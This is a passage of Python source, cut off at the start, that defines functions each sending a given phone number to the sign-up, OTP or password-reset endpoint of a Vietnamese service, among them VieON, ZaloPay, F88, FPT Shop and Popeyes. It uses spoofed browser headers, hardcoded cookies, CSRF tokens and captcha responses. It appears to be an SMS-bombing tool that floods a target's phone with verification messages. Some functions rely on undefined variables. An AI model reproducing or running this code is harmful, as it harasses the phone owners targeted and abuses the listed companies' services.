"https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)

def ahamove(phone):
    mail = random_string(6)
    Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
    Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers)
###

def call11(phone):
  cookies = {
    'OnCredit_id': '643d8607c6ffe8.92935100',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef':
    'o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=',
    'SN5c8116d5e6183': 'rfsd6jmf1e0daeapvmv1p0i6bu',
  }

  headers = {
    'authority': 'oncredit.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'OnCredit_id=643d8607c6ffe8.92935100; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=; SN5c8116d5e6183=rfsd6jmf1e0daeapvmv1p0i6bu',
    'origin': 'https://oncredit.vn',
    'referer': 'https://oncredit.vn/registration',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'data[typeData]':
    'sendCodeReg',
    'data[phone]':
    phone,
    'data[email]':
    'tv5v4v4v4c@gmail.com',
    'data[captcha1]':
    '1',
    'data[lang]':
    'vi',
    'CSRFName':
    'CSRFGuard_ajax',
    'CSRFToken':
    't8ETz5Y5HFnBefT9dEnDBDe9S4D5RdyEFNKSFDn8b5YSFAB7yr5rD5QZ6b974ARi',
  }

  requests.post('https://oncredit.vn/?ajax',
                cookies=cookies,
                headers=headers,
                data=data)

def call1(phone):
    requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login":"0"+phone[1:11]})).text
###
def call2(phone):
    requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":"0"+phone[1:11]}})).text
###
def call3(phone):
    requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers={"Host": "api.senmo.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"104\", \" Not A;Brand\";v\u003d\"99\", \"Google Chrome\";v\u003d\"104\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://senmo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://senmo.vn/user/login","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"phone":"84"+phone[1:11]})).text
###
def call4(phone):
    Headers = {"Host": "atmonline.com.vn","content-length": "46","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json","sec-ch-ua-mobile": "?1","authorization": "","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://atmonline.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://atmonline.com.vn/portal-new/login?mobilePhone\u003d0777531398\u0026requestedAmount\u003d4000000\u0026requestedTerm\u003d4\u0026locale\u003dvn\u0026designType\u003dNEW","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_181P8FC3KD\u003dGS1.1.1681739176.1.1.1681739193.43.0.0"}
    Datason = json.dumps({"mobilePhone": phone,"source":"ONLINE"})
    response = requests.post("https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode",  data=Datason, headers=Headers)
###
def call5(phone):
    Headers = {"Host": "api.thantaioi.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://thantaioi.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://thantaioi.vn/user/login","accept-encoding": "gzip, deflate, br","cookie": "_ga_LBS7YCVKY6\u003dGS1.1.1681807570.2.1.1681807596.34.0.0"}
    Datason = json.dumps({"phone": f"84{phone[1:11]}"})
    response = requests.post("https://api.thantaioi.vn/api/user/send-one-time-password", data=Datason, headers=Headers)
###
def call9(phone):
  cookies = {
    'supportOnlineTalkID':
    'Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6',
    '__cfruid':
    'f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280',
    'XSRF-TOKEN':
    'eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D',
    'sessionid':
    'eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D',
    'utm_uid':
    'eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D',
    'ec_cache_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_cache_client':
    'false',
    'ec_cache_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_png_client':
    'false',
    'ec_png_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client':
    'false',
    'ec_png_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_etag_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'uid':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'client':
    'false',
    'client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
  }

  headers = {
    'authority': 'robocash.vn',
    'accept': '*/*',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'supportOnlineTalkID=Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6; __cfruid=f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280; XSRF-TOKEN=eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D; ec_cache_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_cache_client=false; ec_cache_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_png_client=false; ec_png_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_etag_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; uid=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; client=false; client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'origin': 'https://robocash.vn',
    'referer': 'https://robocash.vn/register',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'phone': phone,
    '_token': 'iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I',
  }

  requests.post('https://robocash.vn/register/phone-resend',
                cookies=cookies,
                headers=headers,
                data=data)
                
headers = {
'Host': 'api.zalopay.vn',
'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
'x-device-model': 'iPhone8,2',
'x-density': 'iphone3x',
'authorization': 'Bearer ',
'x-device-os': 'IOS',
'x-drsite': 'off',
'accept': '*/*',
'x-app-version': '7.13.1',
'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
'x-platform': 'NATIVE',
'x-os-version': '14.6'}
def random_string(length):
            number = '0123456789'
            alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
            id = ''
            for i in range(0,length,2):
                id += random.choice(number)
                id += random.choice(alpha)
            return id            
def zlpay(phone):
    token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
    json_data = {'phone_number': "0"+phone[1:11],'send_otp_token': token}
    response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text     

def vntrip(phone):
    response_vntrip = requests.post('https://micro-services.vntrip.vn/core-user-service/verification/request/phone', headers=ua, json=json_data).text
###
def pop(phone):
    requests.post("https://products.popsww.com/api/v5/auths/register", headers={"Host": "products.popsww.com","content-length": "89","profileid": "62e58a27c6f857005396318f","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InI1aTZqN3dUTERBS3hMV3lZcDdaM2ZnUUJKNWk3U2tmRkJHR2tNNUlCSlYycFdiRDNwbVd1MUM2eTQyVHJRaUIiLCJ1c2VySWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGUiLCJyb2xlcyI6WyJHVUVTVCJdLCJwcm9maWxlcyI6W3siaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGYiLCJhZ2UiOjEzLCJtcGFhIjp7ImlkIjoiNWQyM2UxMjU5NTI1MWI5OGJkMDQzMzc2IiwiYWdlIjoxM319LHsiaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOTAiLCJhZ2UiOjcsIm1wYWEiOnsiaWQiOiI1ZDIzZTFlMjk1MjUxYjk4YmQwNDM0MWQiLCJhZ2UiOjd9fV0sImlhdCI6MTY1OTIxMDI3OSwiZXhwIjoxOTc0NTcwMjc5fQ.3exZEvv0YG1Uw0UYx2Mt9Oj3NhRb8BX-l4tIAcVv9gw","x-env": "production","content-type": "application/json","lang": "vi","sub-api-version": "1.1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","api-key": "5d2300c2c69d24a09cf5b09b","platform": "wap","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://pops.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://pops.vn/auth/signin-signup/signup?isOffSelectProfile\u003dtrue","accept-encoding": "gzip, deflate, br"}, json=({"fullName":"","account": phone,"password":"Abcxaxgh","confirmPassword":"Abcxaxgh"})).text
###
def poy(phone):
    cookies = {
        '_gcl_au': '1.1.1399171366.1685593865',
        '_gid': 'GA1.2.601043050.1685593865',
        '_gat_UA-106834068-1': '1',
        '_gat_UA-149855316-1': '1',
        '_ga': 'GA1.1.1352914107.1685593865',
        '_ga_Y4V7XHSR6R': 'GS1.1.1685593865.1.0.1685593865.0.0.0',
        '__admUTMtime': '1685593865',
        '__uidac': '3060068c024c57cf5bccf43037278ef8',
        '__iid': '',
        '__su': '0',
        '_fbp': 'fb.1.1685593872828.2142938916',
        '_ga_4YCG78W1LS': 'GS1.1.1685593865.1.1.1685593885.0.0.0',
        '_ga_X3WSB3MZGL': 'GS1.1.1685593865.1.1.1685593885.40.0.0',
    }

    headers = {
        'authority': 'api.popeyes.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '_gcl_au=1.1.1399171366.1685593865; _gid=GA1.2.601043050.1685593865; _gat_UA-106834068-1=1; _gat_UA-149855316-1=1; _ga=GA1.1.1352914107.1685593865; _ga_Y4V7XHSR6R=GS1.1.1685593865.1.0.1685593865.0.0.0; __admUTMtime=1685593865; __uidac=3060068c024c57cf5bccf43037278ef8; __iid=; __su=0; _fbp=fb.1.1685593872828.2142938916; _ga_4YCG78W1LS=GS1.1.1685593865.1.1.1685593885.0.0.0; _ga_X3WSB3MZGL=GS1.1.1685593865.1.1.1685593885.40.0.0',
        'origin': 'https://popeyes.vn',
        'referer': 'https://popeyes.vn/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-client': 'WebApp',
    }

    json_data = {
        'phone': phone,
        'firstName': 'to',
        'lastName': 'lon xinh',
        'email': 'hihi@gmail.com',
    }

    response = requests.post('https://api.popeyes.vn/api/v1/register', cookies=cookies, headers=headers, json=json_data)
    
def alfres(phone):
    requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture\u003dvi-VN", headers={"Host": "api.alfrescos.com.vn","content-length": "124","accept-language": "vi-VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","content-type": "application/json","accept": "application/json, text/plain, */*","brandcode": "ALFRESCOS","devicecode": "web","sec-ch-ua-platform": "\"Android\"","origin": "https://alfrescos.com.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://alfrescos.com.vn/","accept-encoding": "gzip, deflate, br"}, json=({"phoneNumber": phone,"secureHash":"add789229e0794d8508f948dacd710ae","deviceId":"","sendTime":1660806807513,"type":2})).text
###
def tv360(phone):
    requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
###
def loship(phone):
    requests.post("https://latte.lozi.vn/v1.2/auth/register/phone/initial", headers={"Host": "latte.lozi.vn","content-length": "101","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":phone[1:11]})).text
###
    
def oldloship   (phone):
    response = requests.post("https://mocha.lozi.vn/v6/invites/use-app", headers={"Host": "mocha.lozi.vn","content-length": "47","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":phone[1:11]}))
###
def fpt(phone):
    requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
#$#
def f88(phone):
    requests.post("https://apigateway.f88.vn/services/appvay/api/onlinelending/VerifyOTP/sendOTP", headers={"Host": "apigateway.f88.vn","content-length": "595","content-encoding": "gzip","traceparent": "00-c7d4ad181d561015110814044adf720e-d3fed9b4added2cf-01","sec-ch-ua-mobile": "?1","authorization": "Bearer null","content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://online.f88.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://online.f88.vn/","accept-encoding": "gzip, deflate, br"}, json={"phoneNumber":"0"+phone[1:11],"recaptchaResponse":"03ANYolqvEe93MY94VJjkvDUIsq6ysACNy1tsnG1xnFq9YLY1gyez-_QvS0YEsxe9D0ddnuXKmlrbWqvT3KTQD2Bhx9yLeQ6M-nzUChGrqS08GEhHIdCpl3JLvHctZYeX18O8qZqcHY-e7qHq1WG7kkPbykyx9KwxMDnzW3j1N0KymuMti1Z0WAUgXHDh-ifJvI3n4lp5Tzsq5k1Nswugf0X3HFexHAm9GACImJIDG46QRucLBRm0df6jfazibClJyKlLXdvnqmrjCt6Wy22C_h-RY9Iilj5Lcy9rawUShIMJoCFX08UOWP_llCE4T5h5kuUk1llSgu9pdHMK2T6OuEROwXt2begTITv-9l534brGibKVlwwbxLtfHWohLRYQC-tjYWWq7avFLPOA9d53_72KLKoYAuKjvqKul683bQ7HtEzZ-eK3VCiBQj1Za1EV3R69e648tCkNkGXr9kpr1n0ccGeNbXSuB3GHQQGPnDIGuYgalvKa77_iX68OQ90PouP2GeT_RvBY3","source":"Online"}).text                                 

def oldzalopay(phone):
    headers = {'Host': 'api.zalopay.vn','x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1','x-device-model': 'iPhone8,2','x-density': 'iphone3x','authorization': 'Bearer ','x-device-os': 'IOS','x-drsite': 'off','accept': '*/*','x-app-version': '7.13.1','accept-language': 'vi-VN;q=1.0, en-VN;q=0.9','user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2','x-platform': 'NATIVE','x-os-version': '14.6',}
    params = {'phone_number': phone,}
    token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
